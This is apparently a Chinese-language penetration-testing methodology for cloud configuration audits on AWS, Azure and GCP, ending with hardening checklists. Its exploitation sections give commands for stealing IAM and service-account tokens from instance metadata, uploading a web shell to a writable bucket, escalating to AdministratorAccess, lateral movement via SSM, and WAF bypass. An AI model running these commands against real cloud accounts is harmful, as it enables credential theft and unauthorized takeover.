# 云配置安全审计方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对云基础设施（AWS、Azure、GCP 等）配置安全审计的系统性方法论。云环境的配置错误是导致数据泄露和未授权访问的主要原因之一。

### 1.2 适用范围
- Amazon Web Services (AWS)
- Microsoft Azure
- Google Cloud Platform (GCP)
- 阿里云
- 腾讯云
- 其他云服务平台

### 1.3 读者对象
- 渗透测试工程师
- 云安全审计人员
- 云运维工程师
- DevSecOps 工程师

---

## 第二部分：核心渗透技术专题

### 专题：云配置安全审计

#### 2.1 技术介绍

云配置错误是指云服务在使用过程中的不安全配置，可能导致数据泄露、未授权访问、资源滥用等安全问题。根据 Gartner 研究，到 2025 年，99% 的云安全故障将由客户方的配置错误引起。

**常见云配置错误类型：**

| 错误类型 | 描述 | 危害等级 |
|---------|------|---------|
| **存储桶公开访问** | S3/Blob 存储配置为公开 | 严重 |
| **IAM 权限过宽** | 角色/用户权限过大 | 严重 |
| **安全组配置错误** | 防火墙规则过于宽松 | 高 |
| **密钥泄露** | Access Key 硬编码或泄露 | 严重 |
| **日志未开启** | 审计日志功能未启用 | 中 |
| **元数据服务暴露** | IMDS 可被 SSRF 访问 | 高 |

**云服务对比：**

| 功能 | AWS | Azure | GCP |
|-----|-----|-------|-----|
| **对象存储** | S3 | Blob Storage | Cloud Storage |
| **身份管理** | IAM | Azure AD | Cloud IAM |
| **计算服务** | EC2 | Virtual Machines | Compute Engine |
| **元数据服务** | IMDS | IMDS | GCE Metadata |

#### 2.2 审计常见于哪些场景

| 场景 | 风险点描述 |
|-----|-----------|
| **云迁移项目** | 快速迁移导致配置不规范 |
| **DevOps 实践** | IaC 模板配置错误 |
| **多账户环境** | 权限管理复杂易出错 |
| **第三方托管** | 外部团队配置标准不一致 |
| **临时资源** | 测试资源配置后未清理 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. 云存储桶枚举**

```bash
# AWS S3 桶枚举
aws s3 ls s3://bucket-name/
aws s3 cp s3://bucket-name/file.txt .

# 使用专用工具
python3 s3scanner.py -f buckets.txt
s3scan --bucket bucket-name

# Azure Blob 容器检测
curl https://accountname.blob.core.windows.net/container?restype=container&comp=list

# GCP Cloud Storage
gsutil ls gs://bucket-name/
```

**2. 元数据服务探测**

```bash
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 (需要 token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
       -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/

# Azure IMDS
curl -H "Metadata:true" \
     "http://169.254.169.254/metadata/instance?api-version=2020-09-01"

# GCP Metadata
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/
```

**3. 子域名枚举发现云服务**

```bash
# 枚举 AWS 相关子域名
subfinder -d target.com | grep -E 's3|cloudfront|elastic'

# 使用 DNS 记录查找
dig target.com CNAME
# 查找指向云服务的 CNAME 记录
```

**4. 自动化扫描工具**

```bash
# Prowler (AWS 安全评估)
git clone https://github.com/prowler-cloud/prowler
./prowler -M json

# ScoutSuite (多云审计)
git clone https://github.com/nccgroup/ScoutSuite
python scout.py aws --profile default

# CloudSploit
node cloudsploit.js
```

##### 2.3.2 白盒测试

**1. IAM 策略审计**

```json
// ❌ 不安全：过度权限
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
    }]
}

// ✅ 安全：最小权限
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": ["s3:GetObject"],
        "Resource": "arn:aws:s3:::bucket-name/prefix/*"
    }]
}
```

**2. 安全组配置检查**

```json
// ❌ 不安全：开放所有端口
{
    "IpPermissions": [{
        "IpProtocol": "-1",
        "IpRanges": [{"CidrIp": "0.0.0.0/0"}]
    }]
}

// ✅ 安全：限制特定端口和 IP
{
    "IpPermissions": [{
        "IpProtocol": "tcp",
        "FromPort": 443,
        "ToPort": 443,
        "IpRanges": [{"CidrIp": "10.0.0.0/8"}]
    }]
}
```

**3. Terraform 配置审计**

```hcl
# ❌ 不安全：S3 桶公开
resource "aws_s3_bucket" "example" {
  bucket = "my-bucket"
  acl    = "public-read"
}

# ✅ 安全：S3 桶私有
resource "aws_s3_bucket" "example" {
  bucket = "my-bucket"
  acl    = "private"
}

# ❌ 不安全：安全组开放
resource "aws_security_group" "example" {
  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

#### 2.4 漏洞利用方法

##### 2.4.1 S3 存储桶利用

```bash
# 1. 列出桶内容
aws s3 ls s3://vulnerable-bucket/ --no-sign-request

# 2. 下载敏感文件
aws s3 cp s3://vulnerable-bucket/config.json . --no-sign-request

# 3. 如果配置错误允许写入
aws s3 cp shell.php s3://vulnerable-bucket/ --no-sign-request

# 4. 访问上传的文件
http://vulnerable-bucket.s3.amazonaws.com/shell.php
```

##### 2.4.2 IAM 凭证利用

```bash
# 1. 通过 SSRF 获取临时凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# 2. 提取 AccessKeyId、SecretAccessKey、Token

# 3. 配置 AWS CLI
aws configure set aws_access_key_id ACCESS_KEY
aws configure set aws_secret_access_key SECRET_KEY
aws configure set aws_session_token TOKEN

# 4. 使用凭证访问云资源
aws s3 ls
aws ec2 describe-instances
```

##### 2.4.3 Azure Blob 存储利用

```bash
# 1. 匿名访问检测
curl https://account.blob.core.windows.net/container/file.txt

# 2. 列出容器内容
curl "https://account.blob.core.windows.net/container?restype=container&comp=list"

# 3. 下载文件
curl -O https://account.blob.core.windows.net/container/sensitive-data.xlsx
```

##### 2.4.4 GCP 服务账号利用

```bash
# 1. 获取服务账号 Token
curl -H "Metadata-Flavor: Google" \
     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# 2. 使用 Token 调用 GCP API
curl -H "Authorization: Bearer TOKEN" \
     "https://www.googleapis.com/storage/v1/b"

# 3. 使用 gcloud 认证
gcloud auth activate-service-account --key-file=key.json
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 WAF 绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **分片上传** | 将大文件分片上传 | AWS multipart upload |
| **编码绕过** | URL 编码特殊字符 | `%2F` 代替 `/` |
| **API 版本绕过** | 使用旧版 API | `?version=2006-03-01` |
| **CDN 绕过** | 直接访问源站 IP | 查找真实 IP |

##### 2.5.2 权限提升

```
# 利用 IAM 策略配置错误
1. 枚举当前角色权限
aws iam get-role --role-name role-name

2. 查找可传递的权限
aws iam list-attached-role-policies --role-name role-name

3. 创建更高权限角色
aws iam create-role --role-name admin-role ...

4. 附加管理员策略
aws iam attach-role-policy --role-name admin-role \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

##### 2.5.3 横向移动

```
# 在同一云环境内横向移动
1. 枚举 EC2 实例
aws ec2 describe-instances

2. 通过 SSM 连接
aws ssm start-session --target instance-id

3. 访问 VPC 内其他资源
通过内网访问 RDS、ElastiCache 等
```

---

## 第三部分：附录

### 3.1 云安全配置检查清单

| 检查项 | AWS | Azure | GCP |
|-------|-----|-------|-----|
| **存储桶权限** | S3 Block Public Access | Blob 公共访问级别 | Cloud Storage 均匀访问 |
| **网络隔离** | VPC + Security Groups | VNet + NSG | VPC + Firewall Rules |
| **密钥管理** | KMS + Secrets Manager | Key Vault | Cloud KMS |
| **日志审计** | CloudTrail + CloudWatch | Monitor + Activity Log | Cloud Audit Logs |
| **身份管理** | IAM + MFA | Azure AD + MFA | Cloud IAM + MFA |

### 3.2 检测工具

| 工具名称 | 云平台 | 用途 |
|---------|-------|------|
| **Prowler** | AWS | 安全最佳实践评估 |
| **ScoutSuite** | 多云 | 配置审计 |
| **CloudSploit** | 多云 | 安全监控 |
| **Pacu** | AWS | 渗透测试框架 |
| **Stormspotter** | Azure | 攻击路径可视化 |

### 3.3 修复建议

- [ ] 启用所有存储桶的阻止公共访问
- [ ] 实施最小权限 IAM 策略
- [ ] 启用云审计日志
- [ ] 使用私有网络隔离资源
- [ ] 启用 MFA 和强认证
- [ ] 定期轮换访问密钥
- [ ] 使用基础设施即代码 (IaC) 管理配置
- [ ] 实施自动化合规检查
